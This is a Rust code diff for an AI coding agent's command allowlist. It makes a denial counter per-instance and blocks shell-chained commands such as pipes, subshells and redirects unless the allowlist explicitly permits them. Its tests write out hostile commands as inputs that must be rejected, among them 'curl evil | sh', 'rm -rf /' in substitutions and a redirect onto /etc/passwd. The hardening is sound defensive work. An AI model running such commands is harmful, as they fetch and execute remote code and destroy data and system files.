@@ -48,15 +48,6 @@ const ACP_DEFAULT_MODEL_ALIAS: &str = "default";
 pub const ORCH_IMPLEMENT_POLICY_KEY: &str = "GOOSE_ORCH_IMPLEMENT_POLICY";
 pub const ORCH_IMPLEMENT_ACTIVE_KEY: &str = "GOOSE_ORCH_IMPLEMENT_ACTIVE";
 pub const ORCH_ALLOWED_COMMANDS_KEY: &str = "GOOSE_ORCH_ALLOWED_COMMANDS";
-static ORCH_IMPLEMENT_DENIAL_COUNT: AtomicU64 = AtomicU64::new(0);
-
-pub fn reset_orch_implement_denial_count() {
-    ORCH_IMPLEMENT_DENIAL_COUNT.store(0, Ordering::Relaxed);
-}
-
-pub fn orch_implement_denial_count() -> u64 {
-    ORCH_IMPLEMENT_DENIAL_COUNT.load(Ordering::Relaxed)
-}
 
 fn is_model_selection_alias(model_name: &str) -> bool {
     matches!(model_name, ACP_CURRENT_MODEL | ACP_DEFAULT_MODEL_ALIAS)
@@ -275,6 +266,10 @@ pub struct AcpProvider {
     mode_mapping: HashMap<GooseMode, String>,
     plan_explore: bool,
     implement_policy: ImplementPolicy,
+    /// Per-instance count of orch-implement allowlist denials during the
+    /// current run. Instance-scoped (not a process global) so concurrent
+    /// sessions — e.g. arena contestants — never corrupt each other's counts.
+    orch_implement_denials: Arc<AtomicU64>,
 
     session: AcpSession,
 
@@ -366,6 +361,11 @@ impl AcpProvider {
         let (init_tx, init_rx) = oneshot::channel();
         let mode_mapping = config.mode_mapping.clone();
         let plan_explore = config.plan_explore;
+        // Per-instance policy resolved at construction from the in-process
+        // Config. During orchestration the runner installs a runtime override
+        // for ORCH_IMPLEMENT_ACTIVE_KEY (never a config-file write), so each
+        // provider instance derives its own policy for the current run; non-orch
+        // sessions resolve to `Auto`.
         let implement_policy = ImplementPolicy::from_config(&config.work_dir);
         let model_config_option_id = config.model_config_option_id.clone();
         let applied_model = config.model_config_option_id.as_ref().and_then(|id| {
@@ -415,6 +415,7 @@ impl AcpProvider {
             mode_mapping,
             plan_explore,
             implement_policy,
+            orch_implement_denials: Arc::new(AtomicU64::new(0)),
             session,
             pending_confirmations: Arc::new(TokioMutex::new(HashMap::new())),
             pending_tool_updates,
@@ -619,6 +620,14 @@ impl Provider for AcpProvider {
         false
     }
 
+    fn orch_implement_denial_count(&self) -> u64 {
+        self.orch_implement_denials.load(Ordering::Relaxed)
+    }
+
+    fn reset_orch_implement_denial_count(&self) {
+        self.orch_implement_denials.store(0, Ordering::Relaxed);
+    }
+
     async fn stream(
         &self,
         model_config: &ModelConfig,
@@ -667,6 +676,7 @@ impl Provider for AcpProvider {
         let model_name = model_config.model_name.clone();
         let plan_explore = self.plan_explore;
         let implement_policy = self.implement_policy.clone();
+        let orch_implement_denials = self.orch_implement_denials.clone();
         let plan_allow_exec = crate::config::Config::global()
             .get_param::<bool>("GOOSE_PLAN_ALLOW_EXEC")
             .unwrap_or(false);
@@ -831,7 +841,7 @@ impl Provider for AcpProvider {
                             }
                             if auto_decision.decision.should_record_rejection() {
                                 if auto_decision.count_as_orch_implement_denial {
-                                    ORCH_IMPLEMENT_DENIAL_COUNT.fetch_add(1, Ordering::Relaxed);
+                                    orch_implement_denials.fetch_add(1, Ordering::Relaxed);
                                 }
                                 rejected_tool_calls.insert(
                                     request.tool_call.tool_call_id.0.to_string(),
@@ -2179,10 +2189,17 @@ fn non_empty(value: &str) -> Option<String> {
 
 fn command_matches_allowlist(command: &str, allowed_commands: &[String]) -> bool {
     let command = command.trim();
+    let command_has_meta = contains_shell_metacharacter(command);
     let first_token = first_command_token(command);
     allowed_commands.iter().any(|allowed| {
         let allowed = allowed.trim();
         if allowed.is_empty() {
+            return false;
+        }
+        // A first-token/prefix match must not approve a shell-chained command
+        // (`cargo test; curl evil | sh`); only an explicit shell-form allowlist
+        // entry — one that itself contains a metacharacter — opts into that.
+        if command_has_meta && !contains_shell_metacharacter(allowed) {
             return false;
         }
         if !allowed.chars().any(char::is_whitespace) {
@@ -2192,6 +2209,18 @@ fn command_matches_allowlist(command: &str, allowed_commands: &[String]) -> bool
             || command
                 .strip_prefix(allowed)
                 .is_some_and(|rest| rest.chars().next().is_some_and(char::is_whitespace))
+    })
+}
+
+/// Characters that let a command chain, redirect, substitute, or spawn a
+/// subshell — the shell metacharacters that turn one approved program into an
+/// arbitrary pipeline.
+fn contains_shell_metacharacter(command: &str) -> bool {
+    command.chars().any(|ch| {
+        matches!(
+            ch,
+            ';' | '&' | '|' | '`' | '$' | '(' | ')' | '<' | '>' | '\n' | '\r'
+        )
     })
 }
 
@@ -2313,6 +2342,7 @@ mod tests {
                 mode_mapping: HashMap::new(),
                 plan_explore: false,
                 implement_policy: ImplementPolicy::Auto,
+                orch_implement_denials: Arc::new(AtomicU64::new(0)),
                 session: AcpSession {
                     id: SessionId::new("test-session"),
                     response: NewSessionResponse::new("test-session"),
@@ -3290,5 +3320,71 @@ mod tests {
                 "missing ACP location line should serialize as null"
             );
         }
+    }
+
+    #[test]
+    fn allowlist_matches_plain_command_by_first_token() {
+        let allow = vec!["cargo".to_string()];
+        assert!(command_matches_allowlist("cargo test", &allow));
+        assert!(command_matches_allowlist("cargo build --release", &allow));
+        assert!(!command_matches_allowlist("curl evil", &allow));
+    }
+
+    #[test]
+    fn allowlist_rejects_shell_chaining_under_plain_entry() {
+        let allow = vec!["cargo".to_string()];
+        // Chaining, piping, subshell, backtick, and redirect all escape a
+        // first-token match and must be denied under a plain entry.
+        assert!(!command_matches_allowlist(
+            "cargo test; curl evil | sh",
+            &allow
+        ));
+        assert!(!command_matches_allowlist(
+            "cargo test && curl evil",
+            &allow
+        ));
+        assert!(!command_matches_allowlist("cargo test | tee out", &allow));
+        assert!(!command_matches_allowlist("cargo test $(rm -rf /)", &allow));
+        assert!(!command_matches_allowlist("cargo test `rm -rf /`", &allow));
+        assert!(!command_matches_allowlist(
+            "cargo test > /etc/passwd",
+            &allow
+        ));
+    }
+
+    #[test]
+    fn allowlist_rejects_chaining_under_plain_multiword_entry() {
+        let allow = vec!["npm".to_string()];
+        assert!(!command_matches_allowlist(
+            "npm run build && npm test",
+            &allow
+        ));
+    }
+
+    #[test]
+    fn allowlist_allows_exact_shell_form_entry() {
+        // An explicit shell-form entry means the owner opted into that exact
+        // chained command, so the metacharacter guard steps aside.
+        let allow = vec!["npm run build && npm test".to_string()];
+        assert!(command_matches_allowlist(
+            "npm run build && npm test",
+            &allow
+        ));
+        // But a different chained command is still rejected.
+        assert!(!command_matches_allowlist(
+            "npm run build && rm -rf /",
+            &allow
+        ));
+    }
+
+    #[test]
+    fn contains_shell_metacharacter_flags_operators_not_plain_flags() {
+        assert!(!contains_shell_metacharacter("cargo clippy -- -D warnings"));
+        assert!(!contains_shell_metacharacter("cargo test --release"));
+        assert!(contains_shell_metacharacter("a && b"));
+        assert!(contains_shell_metacharacter("a | b"));
+        assert!(contains_shell_metacharacter("a > f"));
+        assert!(contains_shell_metacharacter("$(x)"));
+        assert!(contains_shell_metacharacter("a\nb"));
     }
 }
